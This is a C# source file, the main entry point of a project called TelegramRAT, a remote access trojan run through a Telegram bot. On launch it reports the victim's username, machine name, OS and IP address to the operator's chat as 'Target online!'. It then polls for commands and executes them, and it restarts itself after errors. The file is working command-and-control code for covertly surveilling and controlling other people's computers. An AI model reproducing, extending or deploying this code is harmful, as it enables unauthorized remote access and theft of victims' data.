using BotCommand = TelegramRAT.Commands.BotCommand;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Utilities;
using TelegramRAT.Commands;
using System.Diagnostics;
using Telegram.Bot.Types;
using Telegram.Bot;
using System.Net;
using System.Text.Json;

namespace TelegramRAT;

public static class Program
{
    private const string BotTokenEnvironmentVariable = "TELEGRAMRAT_BOT_TOKEN";
    private const string OwnerIdEnvironmentVariable = "TELEGRAMRAT_OWNER_ID";

    private static string BotToken = string.Empty;
    private static long OwnerId;

    public static TelegramBotClient Bot { get; private set; } = null!;
    public static readonly List<BotCommand> Commands = new();
    private const int PollingDelay = 1000;

    public static async Task Main(string[] args)
    {
        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
        {
            Console.WriteLine("Only one instance can be online at the same time!");
            return;
        }

        if (!TryInitializeConfiguration(out var configurationErrorMessage))
        {
            Console.Error.WriteLine(configurationErrorMessage);
            return;
        }

        try
        {
            await RunAsync();
        }
        catch (Exception ex)
        {
            if (OwnerId > 0)
            {
                await ReportExceptionAsync(new Message { Chat = new Chat { Id = OwnerId } }, ex);

                if (ex.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true)
                {
                    await SendErrorAsync(new Message { Chat = new Chat { Id = OwnerId } }, new Exception("Only one bot instance can be online at the same time."));
                    return;
                }

                await Bot.SendMessage(
                    OwnerId,
                    "Attempting to restart. Please wait...",
                    parseMode: ParseMode.Html
                );
            }

            Commands.Clear();
            await Main(args);
        }
    }

    private static bool TryInitializeConfiguration(out string errorMessage)
    {
        var (botTokenValue, ownerIdValue, configurationSourceDescription) = LoadConfiguration();

        if (string.IsNullOrWhiteSpace(botTokenValue))
        {
            errorMessage =
                "BotToken was not provided. Set the TELEGRAMRAT_BOT_TOKEN environment variable or add it to appsettings.json.";
            return false;
        }

        if (!long.TryParse(ownerIdValue, out var ownerId) || ownerId <= 0)
        {
            errorMessage =
                "OwnerId was not provided or is invalid. Set the TELEGRAMRAT_OWNER_ID environment variable or add a numeric value to appsettings.json.";
            return false;
        }

        BotToken = botTokenValue;
        OwnerId = ownerId;
        Bot = new TelegramBotClient(BotToken);

        Console.WriteLine($"TelegramRAT starting. Configuration source: {configurationSourceDescription}. Owner chat ID: {OwnerId}.");

        errorMessage = string.Empty;
        return true;
    }

    private static (string? BotToken, string? OwnerId, string ConfigurationSourceDescription) LoadConfiguration()
    {
        string? botToken = Environment.GetEnvironmentVariable(BotTokenEnvironmentVariable);
        string? ownerId = Environment.GetEnvironmentVariable(OwnerIdEnvironmentVariable);

        var configurationSources = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        if (!string.IsNullOrWhiteSpace(botToken) || !string.IsNullOrWhiteSpace(ownerId))
        {
            configurationSources.Add("environment variables");
        }

        var configurationFilePath = Path.Combine(AppContext.BaseDirectory, "appsettings.json");
        if (File.Exists(configurationFilePath))
        {
            try
            {
                using var document = JsonDocument.Parse(File.ReadAllText(configurationFilePath));
                var root = document.RootElement;

                if (root.TryGetProperty("BotToken", out var botTokenElement))
                {
                    var candidate = botTokenElement.GetString();
                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(botToken))
                    {
                        botToken = candidate;
                        configurationSources.Add("appsettings.json");
                    }
                }

                if (root.TryGetProperty("OwnerId", out var ownerIdElement))
                {
                    var candidate = ownerIdElement.GetString();
                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(ownerId))
                    {
                        ownerId = candidate;
                        configurationSources.Add("appsettings.json");
                    }
                }
            }
            catch (JsonException ex)
            {
                Console.Error.WriteLine($"Failed to read configuration from appsettings.json: {ex.Message}");
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"Failed to access appsettings.json: {ex.Message}");
            }
        }

        if (configurationSources.Count == 0)
        {
            configurationSources.Add("no configuration source detected");
        }

        var configurationSourceDescription = string.Join(" & ", configurationSources.OrderBy(source => source));
        return (botToken, ownerId, configurationSourceDescription);
    }

    private static async Task RunAsync()
    {
        var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));

        var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {Utils.GetWindowsVersion()}\n\nIP: {await Utils.GetIpAddressAsync()}";

        await Bot.SendMessage(
            OwnerId,
            systemInfo,
            ParseMode.Html,
            replyMarkup: markup
        );

        CommandRegistry.InitializeCommands(Commands);

        int offset = 0;

        while (true)
        {
            var updates = await Bot.GetUpdates(offset);
            if (updates.Any())
                offset = updates.Last().Id + 1;

            await UpdateWorkerAsync(updates);
            await Task.Delay(PollingDelay);
        }
    }

    private static async Task UpdateWorkerAsync(IEnumerable<Update> updates)
    {
        foreach (var update in updates)
        {
            if (update.CallbackQuery is not null)
            {
                var callback = update.CallbackQuery;
                await Bot.AnswerCallbackQuery(callback.Id, "Callback received!");

                if (callback.Message.ReplyMarkup != null)
                {
                    await Bot.EditMessageReplyMarkup(
                        callback.Message.Chat.Id,
                        callback.Message.MessageId,
                        replyMarkup: null
                    );
                }

                if (callback.Data == "Show All Commands")
                {
                    var cmd = Commands.FirstOrDefault(c => c.Command == "commands");
                    if (cmd != null)
                        await cmd.Execute(new BotCommandModel { Message = callback.Message });
                }
                continue;
            }

            if (update.Message is null) continue;

            var model = BotCommandModel.FromMessage(update.Message, "/");
            if (model == null) continue;

            var command = Commands.FirstOrDefault(c => c.Command.Equals(model.Command, StringComparison.OrdinalIgnoreCase)) ??
                          Commands.FirstOrDefault(c => c.Aliases?.Contains(model.Command, StringComparer.OrdinalIgnoreCase) == true);

            if (command == null) continue;

            if (command.ValidateModel(model))
            {
                await command.Execute(model);
            }
            else
            {
                await Bot.SendMessage(
                    update.Message.Chat.Id,
                    $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId },
                    parseMode: ParseMode.Html
                );
            }
        }
    }

    public static async Task SendErrorAsync(Message message, Exception ex, bool includeStackTrace = false)
    {
        var encodedMessage = WebUtility.HtmlEncode(ex.Message);
        var errorMessage = includeStackTrace
            ? $"Error: {encodedMessage}\n{WebUtility.HtmlEncode(ex.StackTrace)}"
            : $"Error: {encodedMessage}";

        var replyMarkup = message.ReplyMarkup == null
            ? new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString()))
            : null;

        await Bot.SendMessage(
            message.Chat.Id,
            errorMessage,
            parseMode: ParseMode.Html,
            replyMarkup: replyMarkup
        );
    }

    public static async Task ReportExceptionAsync(Message message, Exception exception)
    {
        #if DEBUG
            bool includeStackTrace = true;
        #else
            bool includeStackTrace = false;
        #endif
        await SendErrorAsync(message, exception, includeStackTrace);
    }

    public static async Task SendSuccessAsync(Message message, string successMessage)
        => await Bot.SendMessage(message.Chat.Id, successMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));

    public static async Task SendInfoAsync(Message message, string infoMessage)
        => await Bot.SendMessage(message.Chat.Id, infoMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));
}
